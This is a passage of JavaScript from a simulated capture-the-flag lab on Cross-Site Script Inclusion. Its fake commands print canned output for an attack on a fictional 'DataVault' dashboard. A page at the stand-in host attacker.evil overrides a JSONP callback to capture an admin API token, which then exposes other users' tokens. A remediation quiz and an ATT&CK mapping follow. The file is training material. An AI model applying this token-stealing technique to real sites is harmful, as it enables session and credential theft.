                return 'xssi-probe -- Cross-Site Script Inclusion Testing Toolkit\n\nUsage:\n  xssi-probe probe         -- Probe target for JSONP/XSSI vulnerability\n  xssi-probe simulate      -- Simulate victim browser loading attacker page\n  xssi-probe admin-scan    -- Test privileged endpoints with captured token\n\nTarget: http://10.10.15.20\nExploit workspace: /home/attacker/exploit/';
            }

            // ── probe: identify the JSONP endpoint ──
            if (sub === 'probe') {
                F15Config._datavault.endpointDiscovered = true;

                return 'xssi-probe: Probing http://10.10.15.20 for XSSI vulnerabilities\n' +
                       '='.repeat(60) + '\n\n' +
                       '  [1/4] Checking endpoint inventory...\n' +
                       '        GET /api/v2/dashboard-stats.js  -- 200 OK\n' +
                       '        GET /api/v2/user-profile.js     -- 200 OK\n' +
                       '        GET /api/v2/admin/users          -- 200 OK (with token)\n\n' +
                       '  [2/4] Checking Content-Type headers...\n' +
                       '        /api/v2/dashboard-stats.js  : application/javascript  [VULNERABLE]\n' +
                       '        /api/v2/user-profile.js     : application/javascript  [VULNERABLE]\n' +
                       '        /api/v2/admin/users          : application/javascript  [VULNERABLE]\n\n' +
                       '  [3/4] Checking XSSI mitigations...\n' +
                       '        X-Content-Type-Options: nosniff  -- NOT FOUND  [FAIL]\n' +
                       '        XSSI prefix (")]}\'")             -- NOT FOUND  [FAIL]\n' +
                       '        CORS headers                     -- NOT FOUND  [FAIL]\n\n' +
                       '  [4/4] Checking cookie security...\n' +
                       '        HttpOnly: YES  (JS cannot read cookie directly)\n' +
                       '        SameSite: NOT SET  [FAIL -- cookie sent on cross-origin <script>]\n\n' +
                       '  RESULT: TARGET IS XSSI-VULNERABLE\n' +
                       '  All three endpoints serve sensitive data as executable JavaScript.\n' +
                       '  Session cookie will be sent on cross-origin script inclusion.\n' +
                       '  The WAF cannot detect this attack.\n\n' +
                       '{{FLAG:recon}}';
            }

            // ── simulate: run the XSSI exploit ──
            if (sub === 'simulate') {
                F15Config._datavault.callbackOverridden = true;
                F15Config._datavault.tokenExtracted = true;

                return 'xssi-probe simulate: Simulating victim browser at attacker.evil\n' +
                       '='.repeat(60) + '\n\n' +
                       '  [VICTIM BROWSER SIMULATION]\n' +
                       '  Victim: admin@datavault.corp (logged-in session active)\n' +
                       '  Victim visits: http://attacker.evil/exploit/attacker.html\n\n' +
                       '  Step 1: Browser parses attacker.html\n' +
                       '          window.dashboardCallback = function(data) {...}  -- DEFINED\n\n' +
                       '  Step 2: Browser encounters <script src="http://10.10.15.20/api/v2/dashboard-stats.js?callback=dashboardCallback">\n' +
                       '          Sends GET request with Cookie: dv_session=a3b8c9d2e1f4\n' +
                       '          (HttpOnly does not prevent cross-origin script inclusion -- only JS access)\n\n' +
                       '  Step 3: DataVault responds:\n' +
                       '          Content-Type: application/javascript\n' +
                       '          dashboardCallback({"user":"admin@datavault.corp","api_token":"dvt_adm_9K2xPqR7mL4nV1wZ8jT3",...});\n\n' +
                       '  Step 4: Browser executes the response.\n' +
                       '          window.dashboardCallback is called with victim\'s data.\n\n' +
                       '  CAPTURED DATA:\n' +
                       '  {\n' +
                       '    "user":        "admin@datavault.corp",\n' +
                       '    "role":        "admin",\n' +
                       '    "api_token":   "dvt_adm_9K2xPqR7mL4nV1wZ8jT3",\n' +
                       '    "total_users": 41892,\n' +
                       '    "plan":        "Enterprise"\n' +
                       '  }\n\n' +
                       '  Written to: /home/attacker/exploit/captured.json\n\n' +
                       '  WAF ALERTS FIRED: 0\n' +
                       '  SERVER LOGS ANOMALY: none (normal script load from browser)\n\n' +
                       '  CALLBACK OVERRIDE SUCCESSFUL:\n' +
                       '{{FLAG:script_exec}}\n\n' +
                       '  API TOKEN EXTRACTED:\n' +
                       '{{FLAG:token}}';
            }

            // ── admin-scan: test privileged endpoints ──
            if (sub === 'admin-scan') {
                const token = F15Config._datavault.tokenExtracted;
                if (!token) {
                    return 'xssi-probe admin-scan: ERROR -- No token available.\nRun: xssi-probe simulate first to extract the API token.';
                }

                F15Config._datavault.privilegeEscalated = true;

                return 'xssi-probe admin-scan: Testing privileged endpoints\n' +
                       '='.repeat(60) + '\n' +
                       '  Token: dvt_adm_9K2xPqR7mL4nV1wZ8jT3 (from captured.json)\n\n' +
                       '  [1/2] GET /api/v2/admin/users\n' +
                       '        Authorization: Bearer dvt_adm_9K2xPqR7mL4nV1wZ8jT3\n' +
                       '        Response: HTTP 200 -- Content-Type: application/javascript\n\n' +
                       '        adminUsersCallback([\n' +
                       '          {"id":1,"email":"admin@datavault.corp","role":"admin","token":"dvt_adm_9K2xPqR7mL4nV1wZ8jT3"},\n' +
                       '          {"id":2,"email":"ceo@datavault.corp","role":"admin","token":"dvt_adm_5Qn8Yb2KpR6mD9sE1fH4"},\n' +
                       '          {"id":3,"email":"ops@datavault.corp","role":"operator","token":"dvt_ops_3Lx7Vc4NwA8tG2qJ5kM0"},\n' +
                       '          {"id":4,"email":"finance@datavault.corp","role":"viewer","token":"dvt_vie_6Rz1Us9BdC3eF7hI2jK8"}\n' +
                       '        ]);\n\n' +
                       '  [2/2] XSSI analysis of /api/v2/admin/users\n' +
                       '        Content-Type: application/javascript  [VULNERABLE]\n' +
                       '        No XSSI prefix                         [FAIL]\n' +
                       '        No nosniff header                      [FAIL]\n\n' +
                       '  RESULT: 4 admin/operator/viewer tokens exposed via privilege escalation.\n' +
                       '  An attacker who performs XSSI on a victim with admin scope gains\n' +
                       '  access to ALL user tokens in the system.\n\n' +
                       '{{FLAG:escalation_priv}}';
            }

            return 'xssi-probe: Unknown subcommand: ' + sub + '\nUsage: xssi-probe [probe|simulate|admin-scan]';
        },

        // ── curl: HTTP requests against the target ──
        'curl': function(args, term, engine) {
            const joined = args.join(' ');
            const url = args.find(a => a.startsWith('http')) || '';

            if (url.includes('dashboard-stats.js')) {
                F15Config._datavault.endpointDiscovered = true;
                const verbose = joined.includes('-v') || joined.includes('--verbose');
                let out = '';
                if (verbose) {
                    out += '* Trying 10.10.15.20:80...\n* Connected.\n> GET /api/v2/dashboard-stats.js?callback=dashboardCallback HTTP/1.1\n> Host: 10.10.15.20\n> Cookie: dv_session=a3b8c9d2e1f4\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/javascript\n< Cache-Control: no-store\n< Server: nginx/1.24.0\n< (no X-Content-Type-Options header)\n< (no SameSite on cookie)\n<\n';
                }
                out += 'dashboardCallback({"user":"admin@datavault.corp","role":"admin","api_token":"dvt_adm_9K2xPqR7mL4nV1wZ8jT3","total_users":41892,"api_calls_today":1247003,"plan":"Enterprise","billing_email":"finance@datavault.corp"});';
                return out;
            }

            if (url.includes('admin/users')) {
                const auth = joined.includes('Bearer');
                if (!auth) {
                    return 'HTTP/1.1 401 Unauthorized\n{"error":"Bearer token required"}';
                }
                F15Config._datavault.privilegeEscalated = true;
                return 'HTTP/1.1 200 OK\nContent-Type: application/javascript\n\nadminUsersCallback([\n  {"id":1,"email":"admin@datavault.corp","role":"admin","token":"dvt_adm_9K2xPqR7mL4nV1wZ8jT3"},\n  {"id":2,"email":"ceo@datavault.corp","role":"admin","token":"dvt_adm_5Qn8Yb2KpR6mD9sE1fH4"},\n  {"id":3,"email":"ops@datavault.corp","role":"operator","token":"dvt_ops_3Lx7Vc4NwA8tG2qJ5kM0"},\n  {"id":4,"email":"finance@datavault.corp","role":"viewer","token":"dvt_vie_6Rz1Us9BdC3eF7hI2jK8"}\n]);';
            }

            if (url.includes('user-profile.js')) {
                return 'profileCallback({"id":1,"email":"admin@datavault.corp","created_at":"2021-04-15T08:22:00Z","mfa_enabled":false,"last_login":"2026-04-11T14:03:17Z","api_quota_remaining":998753});';
            }

            if (url.includes('10.10.15.20') && (url.endsWith('/') || url === 'http://10.10.15.20')) {
                return 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<!DOCTYPE html>...[DataVault Dashboard -- see browser for full render]...\n<!-- API: /api/v2/dashboard-stats.js?callback=dashboardCallback -->\n<!-- API: /api/v2/user-profile.js?callback=profileCallback -->';
            }

            if (url.includes('10.10.15.20')) {
                return 'HTTP/1.1 404 Not Found\nContent-Type: text/html\n\n<h1>404 Not Found</h1>';
            }

            return 'curl: Could not resolve or connect to: ' + url;
        },

        // ── python3: remediation quiz ──
        'python3': function(args, term, engine) {
            const joined = args.join(' ');

            if (joined.includes('remediation-quiz')) {
                F15Config._datavault.remediationDocumented = true;

                return 'remediation-quiz.py\n' +
                       '='.repeat(60) + '\n' +
                       '  XSSI REMEDIATION QUIZ -- DataVault Corp\n' +
                       '='.repeat(60) + '\n\n' +
                       '  Q1: What should replace JSONP?\n' +
                       '  >> fetch() with CORS (Access-Control-Allow-Origin)\n' +
                       '  CORRECT -- JSONP bypasses SOP by design. CORS is the\n' +
                       '  standards-based replacement that gives the server control.\n\n' +
                       '  Q2: What cookie attribute prevents XSSI?\n' +
                       '  >> SameSite=Strict (or Lax)\n' +
                       '  CORRECT -- SameSite=Strict prevents the browser from\n' +
                       '  including the session cookie on any cross-site request,\n' +
                       '  including <script src> inclusions.\n\n' +
                       '  Q3: What prefix breaks script execution?\n' +
                       '  >> )]}\'\\n (XSSI prefix) or while(1);\n' +
                       '  CORRECT -- Prepending non-parseable JS before the JSON\n' +
                       '  means any attempt to execute the response as a script\n' +
                       '  throws a SyntaxError. JSON.parse() strips it correctly.\n\n' +
                       '  Q4: What header enforces Content-Type?\n' +
                       '  >> X-Content-Type-Options: nosniff\n' +
                       '  CORRECT -- Prevents browsers from treating\n' +
                       '  application/json as application/javascript\n' +
                       '  even if Content-Type is wrong.\n\n' +
                       '  ALL DEFENSES CORRECTLY IDENTIFIED.\n' +
                       '  DataVault Corp remediation plan is complete.\n\n' +
                       '{{FLAG:remediation}}';
            }

            return 'python3: ' + args.join(' ') + ': No such file or module.\nAvailable: /home/attacker/tools/remediation-quiz.py';
        }
    },

    // =====================================================
    // MITRE ATT&CK REFERENCE (displayed in briefing)
    // =====================================================

    mitre: {
        tactics: ['Reconnaissance', 'Collection', 'Privilege Escalation', 'Defense Evasion'],
        techniques: [
            { id: 'T1539',       name: 'Steal Web Session Cookie',            phase: 'Collection' },
            { id: 'T1059.007',   name: 'Command and Scripting: JavaScript',   phase: 'Execution' },
            { id: 'T1592.002',   name: 'Gather Victim Host Info: Software',   phase: 'Reconnaissance' },
            { id: 'T1528',       name: 'Steal Application Access Token',      phase: 'Privilege Escalation' },
            { id: 'T1530',       name: 'Data from Cloud Storage Object',      phase: 'Collection' },
            { id: 'T1590.006',   name: 'Gather Victim Network Info: Network Security Appliances', phase: 'Reconnaissance' },
            { id: 'T1562.001',   name: 'Impair Defenses: Disable or Modify Tools', phase: 'Defense Evasion' }
        ]
    }

};
